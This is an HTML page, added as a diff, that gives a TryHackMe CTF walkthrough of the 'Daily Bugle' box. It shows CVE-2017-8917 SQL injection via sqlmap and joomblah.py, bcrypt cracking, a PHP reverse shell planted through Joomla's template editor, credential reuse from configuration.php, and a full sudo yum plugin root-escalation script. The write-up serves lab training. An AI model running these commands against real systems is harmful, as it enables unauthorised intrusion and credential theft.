@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Daily Bugle — TryHackMe walkthrough</title>
+<meta name="description" content="Walkthrough for the Daily Bugle room on TryHackMe: Joomla 3.7.0 SQL injection (CVE-2017-8917), bcrypt cracking, template RCE, credential reuse, and sudo yum GTFOBins privesc." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,500;0,9..144,600;1,9..144,500&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="styles/daily-bugle.css" />
+</head>
+<body>
+<div class="wrap">
+
+  <a href="../walkthroughs.html" class="back">back to walkthroughs</a>
+
+  <header class="wt-header">
+    <div class="wt-platform"><span class="dot">●</span> TryHackMe</div>
+    <h1>Daily <em>Bugle</em></h1>
+    <div class="wt-meta">
+      <span class="badge hard">Hard</span>
+      <span class="badge tag">joomla</span>
+      <span class="badge tag">sqli</span>
+      <span class="badge tag">cve-2017-8917</span>
+      <span class="badge tag">gtfobins</span>
+    </div>
+    <p class="wt-summary">
+      Spider-Man themed Joomla box. Fingerprint a vulnerable 3.7.0 instance, exploit
+      <strong>CVE-2017-8917</strong> (SQL injection in <code>com_fields</code>) to extract a bcrypt
+      password hash, crack it, abuse the admin template editor for RCE, pivot via a password reused
+      from the DB config, and finish with a <code>sudo yum</code> GTFOBins escape.
+    </p>
+  </header>
+
+  <nav class="toc">
+    <div class="toc-title">Contents</div>
+    <ol>
+      <li><a href="#recon">Reconnaissance</a></li>
+      <li><a href="#fingerprint">Joomla version fingerprinting</a></li>
+      <li><a href="#sqli">CVE-2017-8917 — SQL injection</a></li>
+      <li><a href="#crack">Cracking the bcrypt hash</a></li>
+      <li><a href="#rce">Template RCE → www-data</a></li>
+      <li><a href="#pivot">Credential reuse → jjameson</a></li>
+      <li><a href="#root">sudo yum → root</a></li>
+    </ol>
+  </nav>
+
+  <h2 id="recon"><span class="num">01</span> Reconnaissance</h2>
+
+  <pre><code>nmap -sCV -p- -T4 10.10.X.X -oN nmap.txt</code></pre>
+
+  <pre class="output"><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+3306/tcp open  mysql   MariaDB (unauthorized)</code></pre>
+
+  <p>CentOS with Apache/PHP — a strong hint we're dealing with an older CMS. The landing page is a Joomla front-end styled as the Daily Bugle newspaper.</p>
+
+  <h2 id="fingerprint"><span class="num">02</span> Joomla version fingerprinting</h2>
+
+  <p>Joomla exposes its version in several public files — the two reliable ones:</p>
+
+  <pre><code>curl -s http://10.10.X.X/administrator/manifests/files/joomla.xml | head -20
+curl -s http://10.10.X.X/README.txt | head -5</code></pre>
+
+  <pre class="output"><code>&lt;version&gt;3.7.0&lt;/version&gt;
+&lt;name&gt;files_joomla&lt;/name&gt;
+&lt;author&gt;Joomla! Project&lt;/author&gt;</code></pre>
+
+  <p>Joomla <strong>3.7.0</strong> is famously vulnerable to <strong>CVE-2017-8917</strong> — an unauthenticated SQL injection in the <code>com_fields</code> component. Confirm with <code>joomscan</code> if you want redundant output:</p>
+
+  <pre><code>joomscan --url http://10.10.X.X</code></pre>
+
+  <h2 id="sqli"><span class="num">03</span> CVE-2017-8917 — SQL injection</h2>
+
+  <p>The injection point is the <code>list[fullordering]</code> parameter. You can use the public PoC <code>joomblah.py</code> or just <code>sqlmap</code> — I'll show both.</p>
+
+  <h3>Method A — sqlmap</h3>
+  <pre class="exploit"><code>sqlmap -u "http://10.10.X.X/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" \
+  --risk=3 --level=5 --random-agent -p list[fullordering] \
+  -D joomla -T '#__users' -C 'username,password' --dump</code></pre>
+
+  <p>sqlmap will prompt to URL-encode the column name (answer yes) and eventually dump the users table.</p>
+
+  <h3>Method B — joomblah.py</h3>
+  <pre class="exploit"><code>git clone https://github.com/stefanlucas/Exploit-Joomla
+cd Exploit-Joomla
+python2 joomblah.py http://10.10.X.X</code></pre>
+
+  <pre class="output"><code>[-] Fetching CSRF token
+[-] Testing SQLi
+[+] Found table: #__users
+[+] Extracting users
+    Found user: ['811', 'Super User', 'jonah',
+      'jonah@tryhackme.com',
+      '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm',
+      '', '0', '0', '2020-07-13 19:58:02', ...]</code></pre>
+
+  <p>We've got <code>jonah</code>'s bcrypt hash. Note he's a Super User — gold.</p>
+
+  <h2 id="crack"><span class="num">04</span> Cracking the bcrypt hash</h2>
+
+  <p>Bcrypt is hashcat mode <code>3200</code>:</p>
+
+  <pre class="exploit"><code>echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' &gt; hash.txt
+hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force</code></pre>
+
+  <p>Bcrypt is slow — expect minutes, not seconds. Result:</p>
+
+  <pre class="output"><code>$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123</code></pre>
+
+  <p>Login at <code>/administrator/</code> as <code>jonah : spiderman123</code>.</p>
+
+  <h2 id="rce"><span class="num">05</span> Template RCE → www-data</h2>
+
+  <p>With Super User access, we have several RCE paths in the Joomla backend. The cleanest is the template editor.</p>
+
+  <p>Navigate: <strong>Extensions → Templates → Templates</strong> (not <em>Styles</em>). Pick <code>beez3 Details and Files</code>, then open <code>error.php</code> and replace the entire content with a PHP reverse shell. Grab the <strong>php-pentestmonkey</strong> payload from <a href="https://www.revshells.com/" target="_blank" rel="noopener noreferrer">revshells.com</a> (set your IP and port, select <em>PHP PentestMonkey</em>), paste it in, and save.</p>
+
+  <p>Save template. Start a listener:</p>
+  <pre><code>nc -lnvp 4444</code></pre>
+
+  <p>Trigger — the Beez3 <code>error.php</code> is reachable directly:</p>
+  <pre><code>curl http://10.10.X.X/templates/beez3/error.php</code></pre>
+
+  <p>If that path 404s on your instance, force any Joomla error and the template renders it; e.g. <code>curl http://10.10.X.X/index.php?option=com_invalid</code>.</p>
+
+  <p>Shell lands as <code>apache</code> (CentOS's www-data). Stabilise:</p>
+  <pre><code>python -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl-Z; stty raw -echo; fg; export TERM=xterm</code></pre>
+
+  <h2 id="pivot"><span class="num">06</span> Credential reuse → jjameson</h2>
+
+  <p>Joomla stores its DB credentials in <code>configuration.php</code> at the webroot:</p>
+
+  <pre><code>cat /var/www/html/configuration.php | grep -Ei "user|pass|host"</code></pre>
+  <pre class="output"><code>public $user = 'root';
+public $password = '&lt;long_password_string&gt;';
+public $db = 'joomla';
+public $host = 'localhost';</code></pre>
+
+  <p>Check who has a login shell:</p>
+  <pre><code>cat /etc/passwd | grep -E "bash|sh$"</code></pre>
+  <pre class="output"><code>root:x:0:0:root:/root:/bin/bash
+jjameson:x:1000:1000::/home/jjameson:/bin/bash</code></pre>
+
+  <p>The DB password is reused for the system user <code>jjameson</code>:</p>
+  <pre><code>su jjameson
+# &lt;paste the DB password from configuration.php&gt;
+cat /home/jjameson/user.txt</code></pre>
+
+  <div class="note">
+    On the current Daily Bugle instance the DB/system password is a memorable Rick-Astley reference — take whatever <code>configuration.php</code> gives you and use it verbatim. If <code>su</code> complains, double-check you haven't mixed up quoting or leading whitespace when copying.
+  </div>
+
+  <h2 id="root"><span class="num">07</span> sudo yum → root</h2>
+
+  <pre><code>sudo -l</code></pre>
+  <pre class="output"><code>User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum</code></pre>
+
+  <p>Passwordless <code>yum</code> is a straight trip to root via GTFOBins. The reliable method is the <strong>plugin</strong> technique — we tell yum to load a custom plugin path containing a Python plugin that spawns a shell when yum initialises:</p>
+
+  <pre class="exploit"><code>TF=$(mktemp -d)
+
+cat &gt; $TF/x.conf &lt;&lt;EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat &gt; $TF/y.conf &lt;&lt;EOF
+[main]
+enabled=1
+EOF
+
+cat &gt; $TF/y.py &lt;&lt;EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version = '2.1'
+def init_hook(conduit):
+    os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x.conf --enableplugin=y</code></pre>
+
+  <p>yum starts up, loads our plugin, the <code>init_hook</code> fires, and <code>execl</code> swaps the process for <code>/bin/sh</code> running as root. Finish up:</p>
+
+  <pre><code># id → uid=0(root) gid=0(root)
+cat /root/root.txt</code></pre>
+
+  <h2><span class="num">08</span> Wrap-up</h2>
+
+  <p>What makes Daily Bugle a good hard-tier box is that none of the individual steps is hard — they're all standard OSCP-flavoured techniques — but you have to chain six of them cleanly:</p>
+  <ol>
+    <li>Service &amp; version enum → Joomla 3.7.0.</li>
+    <li>CVE lookup → CVE-2017-8917 (<code>com_fields</code> SQLi).</li>
+    <li>SQLi dump → bcrypt hash.</li>
+    <li>Hashcat <code>-m 3200</code> + rockyou → <code>spiderman123</code>.</li>
+    <li>Template editor RCE as <code>apache</code>.</li>
+    <li>Credential hunting in <code>configuration.php</code> → password reuse to <code>jjameson</code>.</li>
+    <li><code>sudo yum</code> GTFOBins plugin trick → root.</li>
+  </ol>
+
+  <p><em>Takeaway:</em> every CMS has a <code>configuration</code>/<code>wp-config</code>/<code>.env</code> type file. The first thing to do after landing a web-user shell is <code>find / -name "*config*" 2&gt;/dev/null</code> and look for reused passwords.</p>
+
+  <footer>
+    <div>LOOKY · writeup</div>
+    <div>TryHackMe · Daily Bugle</div>
+  </footer>
+
+</div>
+</body>
+</html>
